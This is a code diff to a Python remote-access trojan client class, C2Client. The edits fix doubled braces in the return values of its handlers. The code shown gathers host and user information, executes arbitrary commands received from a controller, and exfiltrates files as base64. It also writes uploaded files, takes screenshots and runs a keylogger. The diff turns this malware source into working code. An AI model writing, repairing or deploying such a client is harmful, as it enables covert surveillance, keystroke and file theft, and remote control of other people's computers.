@@ -121,14 +121,14 @@ class C2Client:
     
     def get_system_info(self):
         """Get system information"""
-        return {{
+        return {
             'type': 'info',
             'hostname': platform.node(),
             'platform': platform.system(),
             'user': os.getenv('USERNAME', 'unknown'),
             'ip': self.ip,
             'port': self.port
-        }}
+        }
     
     def cmd_execute(self, cmd):
         """Execute system command"""
@@ -143,15 +143,15 @@ class C2Client:
         try:
             with open(file_path, 'rb') as f:
                 data = f.read()
-            return {{
+            return {
                 'type': 'download',
                 'success': True,
                 'file': file_path,
                 'data': base64.b64encode(data).decode(),
                 'size': len(data)
-            }}
+            }
         except Exception as e:
-            return {{'type': 'download', 'success': False, 'error': str(e)}}
+            return {'type': 'download', 'success': False, 'error': str(e)}
     
     def cmd_upload(self, file_path, file_data):
         """Upload file"""
@@ -159,9 +159,9 @@ class C2Client:
             decoded = base64.b64decode(file_data)
             with open(file_path, 'wb') as f:
                 f.write(decoded)
-            return {{'type': 'upload', 'success': True, 'file': file_path}}
+            return {'type': 'upload', 'success': True, 'file': file_path}
         except Exception as e:
-            return {{'type': 'upload', 'success': False, 'error': str(e)}}
+            return {'type': 'upload', 'success': False, 'error': str(e)}
     
     def cmd_screenshot(self):
         """Capture screenshot"""
@@ -191,15 +191,15 @@ class C2Client:
                 with open(filename, 'rb') as f:
                     data = f.read()
                 os.remove(filename)
-                return {{
+                return {
                     'type': 'screenshot',
                     'success': True,
                     'data': base64.b64encode(data).decode(),
                     'size': len(data)
-                }}
+                }
         except:
             pass
-        return {{'type': 'screenshot', 'success': False}}
+        return {'type': 'screenshot', 'success': False}
     
     def cmd_keylogger(self, duration=60):
         """Simple keylogger"""
@@ -218,22 +218,22 @@ class C2Client:
             except:
                 pass
             
-            return {{'type': 'keylog', 'keys': ''.join(keys)}}
+            return {'type': 'keylog', 'keys': ''.join(keys)}
         except:
-            return {{'type': 'keylog', 'error': 'Failed'}}
+            return {'type': 'keylog', 'error': 'Failed'}
     
     def handle_command(self, cmd_data):
         """Handle incoming command"""
         try:
             if not isinstance(cmd_data, dict):
                 self.debug_log("[CMD] Error: cmd_data is not a dict, it's a {0}: {1}".format(type(cmd_data), str(cmd_data)[:100]))
-                return {{'type': 'error', 'msg': 'Invalid command format'}}
+                return {'type': 'error', 'msg': 'Invalid command format'}
             
             cmd_type = cmd_data.get('cmd')
             
             if cmd_type == 'exec':
                 output = self.cmd_execute(cmd_data.get('data', ''))
-                return {{'type': 'exec', 'output': output}}
+                return {'type': 'exec', 'output': output}
             
             elif cmd_type == 'download':
                 return self.cmd_download(cmd_data.get('file'))
@@ -252,15 +252,15 @@ class C2Client:
             
             elif cmd_type == 'exit':
                 self.running = False
-                return {{'type': 'exit'}}
+                return {'type': 'exit'}
             
             self.debug_log("[CMD] Unknown command type: {0}".format(cmd_type))
-            return {{'type': 'error', 'msg': 'Unknown command'}}
+            return {'type': 'error', 'msg': 'Unknown command'}
         except Exception as e:
             self.debug_log("[CMD] Exception in handle_command: {0}".format(str(e)))
             import traceback
             self.debug_log("[CMD] Traceback: {0}".format(traceback.format_exc()))
-            return {{'type': 'error', 'msg': str(e)}}
+            return {'type': 'error', 'msg': str(e)}
     
     def run(self):
         """Main loop with retry logic"""
